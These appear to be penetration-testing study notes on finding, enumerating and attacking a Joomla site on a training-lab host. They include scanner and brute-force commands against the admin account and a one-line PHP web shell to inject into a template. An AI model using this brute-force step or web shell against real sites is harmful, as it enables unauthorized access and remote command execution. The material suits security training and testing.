# Discovery and Enumeration 

## Discovery
```shell
curl -s http://dev.inlanefreight.local/ | grep Joomla
```
### Robots.txt 
* Example:
```txt
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
### README.txt
```shell
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```
### JavaScript files
```shell
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

## Enumeration 
### Droopescan
* [Plugin](https://github.com/SamJoan/droopescan) that works for SilverStripe, WordPress and Drupal
```shell
sudo pip3 install droopescan
```

```shell
droopescan scan joomla --url http://dev.inlanefreight.local/
```
### JoomlaScan
* [Little bit out of data](https://github.com/drego85/JoomlaScan)
```shell
sudo python2.7 -m pip install urllib3
sudo python2.7 -m pip install certifi
sudo python2.7 -m pip install bs4
```

```shell
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```
### Password Enumeration 
* Default username is admin
* [Brute Force Tool](https://github.com/ajnik/joomla-bruteforce)
```shell
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
# Attacking Joomla
## Abusing Built-In Functionality 
* Adding PHP to templates:
	`Templates > Configuration > choose template > Templates: Customise > Choose page`
 ```php
system($_GET['0']);
```
## Leveraging Known Vulnerabilities 
* Research based on the installed version 
* List of [CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html)
